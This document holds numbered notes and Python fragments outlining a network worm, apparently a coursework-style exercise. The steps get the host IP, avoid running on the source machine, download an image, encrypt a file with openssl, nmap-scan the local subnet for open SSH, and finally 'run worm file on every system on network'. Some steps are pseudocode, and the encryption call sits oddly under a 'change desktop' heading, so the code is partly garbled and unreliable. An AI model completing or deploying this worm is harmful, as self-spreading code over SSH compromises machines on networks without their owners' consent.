1. get host IP

############################################
# This file gives function getifip() which
# you can use to learn the IP address of the
# first interface whose IP is not 127.0.0.1
# IMPORTANT: you need to run pip install 
# netifaces for this to work.
############################################

# The necessary files
import socket, fcntl, struct
import netifaces

#############################################
# Retrieves the ip of the network card with 
# an IPv4 address that is not 127.0.0.1.
# @return - the string containing the IP 
# address of the network adapter that is not
# if the IP is not 127.0.0.1; returns None
# if no such interface is detected
##############################################
def getifip():

	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr
print getifip()	

2. check if on source

source = ""
if (IP_address == source):
  "dont execute"
  
3. get an image
urllib.urlretrieve("web address", "what to name the file")

4. change a users desktop to a given image
# openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc
call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "runprog.py", "-out", "runprog.py.enc", "-k", "pass"])


5/6. discover other ips on the network using nmap and check if ssh
import nmap	

portScanner = nmap.PortScanner()
portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
hostInfo = portScanner.all_hosts()	
liveHosts = []
for host in hostInfo:
  if portScanner[host].state() == "up" and check if ssh:
    liveHosts.append(host)
return liveHosts


7. run worm file on every system on network

for (host in liveHosts):
  get ip
  run worm on ip

